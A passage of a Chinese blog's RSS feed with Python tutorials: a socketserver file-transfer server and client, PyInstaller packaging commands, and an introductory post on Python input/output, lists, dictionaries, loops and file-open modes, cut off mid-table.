&lt;td style=&#34;text-align:left&#34;&gt;返回套接字的文件描述符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.setblocking(flag)&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;如果 flag 为 0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用 recv () 没有发现任何数据，或 send () 调用无法立即发送数据，那么将引起 socket.error 异常。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;s.makefile()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;创建一个与该套接字相关连的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;socket文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socket文件传输&#34;&gt;#&lt;/a&gt; Socket 文件传输&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Server

import socketserver
import struct
import os
import re
import json
import struct
from optparse import OptionParser

def sendFile(conn, head_info,head_info_len,filename):
    try:
        conn.send(head_info_len)
        conn.send(head_info.encode(&#39;utf-8&#39;))
        with open(filename, &#39;rb&#39;) as f:
            conn.sendall(f.read())
        print(&#39;[+]send success! &#39;+filename)
    except:
        print(&#39;[-]send fail! &#39; + filename)

def operafile(filename):
    filesize_bytes = os.path.getsize(filename)
    pattern = re.compile(r&#39;([^&amp;lt;&amp;gt;/\\\|:&amp;quot;&amp;quot;\*\?]+\.\w+$)&#39;)
    data = pattern.findall(filename)
    head_dir = &amp;#123;
        &#39;filename&#39;: data,
        &#39;filesize_bytes&#39;: filesize_bytes,
    &amp;#125;
    head_info = json.dumps(head_dir)
    head_info_len = struct.pack(&#39;i&#39;, len(head_info))
    return head_info_len, head_info

class MyServer(socketserver.BaseRequestHandler):
    buffsize = 1024
    def handle(self):
        print(&#39;[+]远程客户端ip地址：&#39;, self.client_address[0],&#39;\n&#39;)
        while True:
            filename = input(&#39;请输入要发送的文件名&amp;gt;&amp;gt;&amp;gt;&#39;).strip() #移除字符串头尾指定的字符（默认为空格或换行符）或字符序列
            if(filename == &amp;quot;exit&amp;quot;):
                break
            head_info_len, head_info = operafile(filename)
            sendFile(self.request,head_info,head_info_len,filename)
        self.request.close()

def main():
    parser = OptionParser(&amp;quot;Usage:%prog -p &amp;lt;port&amp;gt; &amp;quot;)   # 输出帮助信息
    parser.add_option(&#39;-p&#39;,type=&#39;string&#39;,dest=&#39;port&#39;,help=&#39;specify targer port&#39;)   # 获取ip地址参数
    options,args = parser.parse_args()
    port = int(options.port)

    print(&amp;quot;[+]listening at &amp;quot; + str(port))
    s = socketserver.ThreadingTCPServer((&#39;0.0.0.0&#39;, port), MyServer)  #
    s.serve_forever()

if __name__ == &#39;__main__&#39;:
    try:
        main()
    except KeyboardInterrupt:
        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#client

from socket import *
import os
import sys
import json
import struct
from optparse import OptionParser

def recv_file(head_dir, tcp_client):
    filename = head_dir[&#39;filename&#39;]
    filesize = head_dir[&#39;filesize_bytes&#39;]
    print(&amp;quot;[+]filename: &amp;quot;+filename[0])
    print(&amp;quot;[+]filesize: &amp;quot;+ str(filesize))
    recv_len = 0
    f = open(filename[0], &#39;wb&#39;)
    while recv_len &amp;lt; filesize:
        if(filesize &amp;gt; 1024):
            recv_mesg = tcp_client.recv(1024)
            recv_len += len(recv_mesg)
            f.write(recv_mesg)
        else:
            recv_mesg = tcp_client.recv(filesize)
            recv_len += len(recv_mesg)
            f.write(recv_mesg)
    f.close()
    print(&#39;[+]文件传输完成!&#39;)

def main():
    parser = OptionParser(&amp;quot;Usage:%prog -u &amp;lt;target address&amp;gt; -p &amp;lt;port&amp;gt; &amp;quot;)   # 输出帮助信息
    parser.add_option(&#39;-u&#39;, type=&#39;string&#39;, dest=&#39;ip&#39;, help=&#39;specify targer ip&#39;)  # 获取ip地址参数
    parser.add_option(&#39;-p&#39;,type=&#39;string&#39;,dest=&#39;port&#39;,help=&#39;specify targer port&#39;)   # 获取ip地址参数
    options,args = parser.parse_args()
    target_port = int(options.port)
    target_ip = options.ip

    tcp_client = socket(AF_INET, SOCK_STREAM)  # socket初始化
    ip_port = ((target_ip, target_port))
    tcp_client.connect_ex(ip_port)
    print(&#39;[+]等待服务端应答数据....&#39;)
    struct_len = tcp_client.recv(4)  # 接收报头长度
    struct_info_len = struct.unpack(&#39;i&#39;, struct_len)[0]  # 解析得到报头信息的长度
    print(&amp;quot;[+]接收头信息长度：&amp;quot; + str(struct_info_len))
    head_info = tcp_client.recv(struct_info_len)
    head_dir = json.loads(head_info.decode(&#39;utf-8&#39;))  # 将报头的内容反序列化
    print(&amp;quot;[+]输出头部信息内容：&amp;quot; + str(head_dir))
    recv_file(head_dir, tcp_client)

if __name__ == &#39;__main__&#39;:
    try:
        main()
    except KeyboardInterrupt:
        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;可执行文件的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可执行文件的转换&#34;&gt;#&lt;/a&gt; 可执行文件的转换&lt;/h2&gt;
&lt;p&gt;当开发者向普通用户分享程序的时候，为了方便用户在未安装 Python 环境的情况下能够正常运行，需要将为开发号的程序进行打包，转换成用户可执行的文件类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PyInstaller&lt;/li&gt;
&lt;li&gt;Py2exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面是两种常见的打包工具，PyInstaller 打包的执行文件，只能在与执行打包操作系统的同类型环境下运行&lt;/p&gt;
&lt;h3 id=&#34;pyinstaller安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pyinstaller安装&#34;&gt;#&lt;/a&gt; PyInstaller 安装&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;pip install pyinstaller
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;win系统下的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win系统下的转换&#34;&gt;#&lt;/a&gt; win 系统下的转换&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;pyinstaller -F -i ico文件 py文件
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;linux下的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux下的转换&#34;&gt;#&lt;/a&gt; Linux 下的转换&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;pyinstaller -F py文件
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</guid>
            <title>Python安全基础</title>
            <link>https://blog.xcu.icu/2023/01/31/python%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</link>
            <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
            <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
            <pubDate>Tue, 31 Jan 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h2&gt;
&lt;p&gt;诞生与 1989 年圣诞节期间，吉多・范罗苏姆为了打发时间，而决心开发一款作为 ABC（专门为非专业程序员设计的一种教学语言）的一个继承，与 1991 年发行第一个版本。&lt;/p&gt;
&lt;p&gt;python 的运用场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;人工智能
&lt;ul&gt;
&lt;li&gt;机器学习，神经网络，深度学习&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;云计算
&lt;ul&gt;
&lt;li&gt;开源云计算解决方案&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大数据
&lt;ul&gt;
&lt;li&gt;数据分析，数据可视化，数据挖掘&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网络爬虫
&lt;ul&gt;
&lt;li&gt;主流爬虫设计语言，Scrapy 框架&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自动化维护
&lt;ul&gt;
&lt;li&gt;selenium&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;web 开发
&lt;ul&gt;
&lt;li&gt;web2py 框架&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;科学计算
&lt;ul&gt;
&lt;li&gt;NumPy，SciPy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常规软件开发
&lt;ul&gt;
&lt;li&gt;软件开发，脚本编写，网络编程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;第一个python程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一个python程序&#34;&gt;#&lt;/a&gt; 第一个 python 程序&lt;/h2&gt;
&lt;p&gt;相比各位学 c 的第一个程序，应该都是打印一个”Hello World“了吧，那 python 的入门我们也从打印 “Hello World” 开始&lt;/p&gt;
&lt;p&gt;可以从我们的 dos 窗口来执行 python 代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126222928427.png&#34; alt=&#34;image-20230126222928427&#34; /&gt;&lt;/p&gt;
&lt;p&gt;当然也可以使用一些编译器如 PyCharm 或者 vscode 编写程序&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126223140132.png&#34; alt=&#34;image-20230126223140132&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;python的输入输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的输入输出&#34;&gt;#&lt;/a&gt; python 的输入输出&lt;/h2&gt;
&lt;h3 id=&#34;输入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入&#34;&gt;#&lt;/a&gt; 输入&lt;/h3&gt;
&lt;p&gt;上面的第一个程序使用的就是一个输出语句&lt;/p&gt;
&lt;p&gt;printf () 是函数，参数就是要输出的内容，这些内容可以是字符串，数值，列表或者字典等数据类型，输出多个参数使用 &amp;quot;,&amp;quot; 隔开或者使用加号链接&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;上面两种链接方式，隔开的会有空格，而+链接的没有&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;双引号或者是单引号之间包裹的是字符串常量会按照原样输出，为用引号包裹的是变量，会输出其代表的含义&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print函数执行后默认换行，如果不需要换行这在其后加上end = &#39;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126224138887.png&#34; alt=&#34;image-20230126224138887&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上面提到换行这里简单说明一下 \n 和 \r 的区别&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&#39;\r&#39; 回车，回到当前行的行首，而不会换到下一行，如果接着输出的话，本行以前的内容会被逐一覆盖；&lt;/li&gt;
&lt;li&gt;&#39;\n&#39; 换行，换到当前位置的下一行，而不会回到行首；&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出&#34;&gt;#&lt;/a&gt; 输出&lt;/h3&gt;
&lt;p&gt;input () 函数是 Python 语言的一个基本输入函数，默认的输入类型为字符串型&lt;/p&gt;
&lt;p&gt;这个函数的参数会被打印出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225834731.png&#34; alt=&#34;image-20230126225834731&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里默认的数据类型是 string，可以使用类型转换改变数据类型&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225950928.png&#34; alt=&#34;image-20230126225950928&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;python的注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的注释&#34;&gt;#&lt;/a&gt; python 的注释&lt;/h3&gt;
&lt;p&gt;这里主要分为多行注释和单行注释&lt;/p&gt;
&lt;p&gt;单行注释：# 右边的代码不会被执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190533214.png&#34; alt=&#34;image-20230127190533214&#34; /&gt;&lt;/p&gt;
&lt;p&gt;多行注释：两组三个连续的单引号或者双引号&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190559328.png&#34; alt=&#34;image-20230127190559328&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;python序列控制结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python序列控制结构&#34;&gt;#&lt;/a&gt; python 序列 &amp;amp; 控制结构&lt;/h2&gt;
&lt;h3 id=&#34;列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#列表&#34;&gt;#&lt;/a&gt; 列表&lt;/h3&gt;
&lt;p&gt;在 Python 中，序列是最基本的数据结构，相当于 c 中的数组结构。Python 中序列包括列表、元组、字典等。&lt;/p&gt;
&lt;p&gt;在列表中所有的元素都放在一对 &amp;quot;[]&amp;quot; 中，相邻元素之间使用逗号隔开，例如：[&#39;demo1&#39;,&#39;demo2&#39;]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;列表的创建&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;直接写成列表的形式写出&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185445030.png&#34; alt=&#34;image-20230128185445030&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 list () 函数将其他类型转化为列表&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185745219.png&#34; alt=&#34;image-20230128185745219&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列表的删除&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;删除单个元素使用 del，指定列表名和元素名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185929574.png&#34; alt=&#34;image-20230128185929574&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除整个列表，使用 del，指定列表名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190015177.png&#34; alt=&#34;image-20230128190015177&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列表末尾添加元素&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用 append 函数添加单个元素&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190202762.png&#34; alt=&#34;image-20230128190202762&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 extend 添加一个列表&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190627401.png&#34; alt=&#34;image-20230128190627401&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;指定位置添加元素&lt;/p&gt;
&lt;p&gt;使用 insert 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190333193.png&#34; alt=&#34;image-20230128190333193&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里第一个差数是插入位置，第二个元素是插入元素&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除第一次出现的元素，使用 remove 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205433785.png&#34; alt=&#34;image-20230129205433785&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除并返回指定下标的元素，使用 pop 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205831666.png&#34; alt=&#34;image-20230129205831666&#34; /&gt;&lt;/p&gt;
&lt;p&gt;pop 函数如果没有设置参数则默认删除最后一个元素&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205914061.png&#34; alt=&#34;image-20230129205914061&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;返回指定元素在列表中出现的次数，使用 count 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210057758.png&#34; alt=&#34;image-20230129210057758&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对列表逆序&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210519854.png&#34; alt=&#34;image-20230129210519854&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对列表进行一个排序，使用 sort 函数，key 参数指定排序依据，reverse 决定升序（False）还是降序（True）&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129211950790.png&#34; alt=&#34;image-20230129211950790&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129212137421.png&#34; alt=&#34;image-20230129212137421&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;元组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元组&#34;&gt;#&lt;/a&gt; 元组&lt;/h3&gt;
&lt;p&gt;与列表不同的是，元组使用 () 包裹，且属于不可变序列，也就是说，一旦创建后无法进行增删改查的操纵，但是访问速度比列表快，也更加安全&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230129213203088.png&#34; alt=&#34;image-20230129213203088&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;字典&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字典&#34;&gt;#&lt;/a&gt; 字典&lt;/h3&gt;
&lt;p&gt;Python 中的字典不同于在渗透测试中使用的字典，其是包含若干 “键：值” 元素的可变序列，字典中的每一个元素都包含用冒号分开的 “键 &amp;quot; 和 “值”，不同元素之间用逗号隔开，所有元素放在 - 对大括号 “{” 和 “)” 中，另外，需要注意的是字典中的 “键” 不能重复，而 “值” 可以重复&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213256872.png&#34; alt=&#34;image-20230129213256872&#34; /&gt;&lt;/p&gt;
&lt;p&gt;前面说到元组不能进行增删改查，但是字典是可以的，而且我个人感觉这个我用的还比较多&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;修改字典中的元素，类似数组的赋值方法去修改，不过这里不使用下标，而是键值，例如：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213818546.png&#34; alt=&#34;image-20230129213818546&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为字典添加新元素，像上面一样就可以&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129214743341.png&#34; alt=&#34;image-20230129214743341&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除字典中的一个元素，还是使用 del 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215030874.png&#34; alt=&#34;image-20230129215030874&#34; /&gt;&lt;/p&gt;
&lt;p&gt;删除整个也是同列表一样使用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215126535.png&#34; alt=&#34;image-20230129215126535&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;选择结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#选择结构&#34;&gt;#&lt;/a&gt; 选择结构&lt;/h3&gt;
&lt;p&gt;说白了也就是 if 语句，比如说判断成绩小于 60 为不及格，高于 90 为优秀可以使用下面的代码实现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215827705.png&#34; alt=&#34;image-20230129215827705&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里记得要注意，input 默认是 str 类型&lt;/p&gt;
&lt;h3 id=&#34;循环结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#循环结构&#34;&gt;#&lt;/a&gt; 循环结构&lt;/h3&gt;
&lt;p&gt;在 python 中有两种循环结构，分别为 for 循环和 while 循环，for 循环主要使用在有明显边界范围的情况，而 while 主要使用在范围不能确定的情况&lt;/p&gt;
&lt;h4 id=&#34;for循环&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#for循环&#34;&gt;#&lt;/a&gt; for 循环&lt;/h4&gt;
&lt;p&gt;上面提到，边界明确和固定，比如，计算 1 加到 100&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129221950576.png&#34; alt=&#34;image-20230129221950576&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;while循环&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#while循环&#34;&gt;#&lt;/a&gt; while 循环&lt;/h4&gt;
&lt;p&gt;当无边界时，常使用的循环结构，比如 1 加到 x&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129222336287.png&#34; alt=&#34;image-20230129222336287&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;文件异常处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件异常处理&#34;&gt;#&lt;/a&gt; 文件 &amp;amp; 异常处理&lt;/h2&gt;
&lt;h3 id=&#34;文件处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件处理&#34;&gt;#&lt;/a&gt; 文件处理&lt;/h3&gt;
&lt;p&gt;文件是以硬盘为载体存储在计算机上的信息集合，有数据库文件，图像文件，音频，视频，文本文件等等&lt;/p&gt;
&lt;p&gt;这里的文件操纵主要是对文本文件进行一个操作，对于文本文件来说，文件操作的基本流程分为三个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;打开文件并创建对象&lt;/li&gt;
&lt;li&gt;对文件内容进行增删改查&lt;/li&gt;
&lt;li&gt;关闭文件&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;创建文件对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建文件对象&#34;&gt;#&lt;/a&gt; 创建文件对象&lt;/h4&gt;
&lt;p&gt;在 python 中内置了文件对象，通过 open 函数可以制定模式打开指定文件并创建文件对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;open(name[, mode[, buffering[,encoding=[]]]])
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;name : 一个包含了你要访问的文件名称的字符串值。&lt;/li&gt;
&lt;li&gt;mode : mode 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读 (r)。&lt;/li&gt;
&lt;li&gt;buffering : 如果 buffering 的值被设为 0，就不会有寄存。如果 buffering 的值取 1，访问文件时会寄存行。如果将 buffering 的值设为大于 1 的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。&lt;/li&gt;
&lt;li&gt;encoding: 指定文本的编码模式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下表是 mode 的参数和对应的模式&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;模式&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;文本模式 (默认)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;x&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;写模式，新建一个文件，如果该文件已存在则会报错。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;b&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;二进制模式。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件进行更新 (可读可写)。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;U&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;通用换行模式（不推荐）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;r&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;rb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;r+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。文件指针将会放在文件的开头。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;rb+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;w&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;wb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;w+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;wb+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;a&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
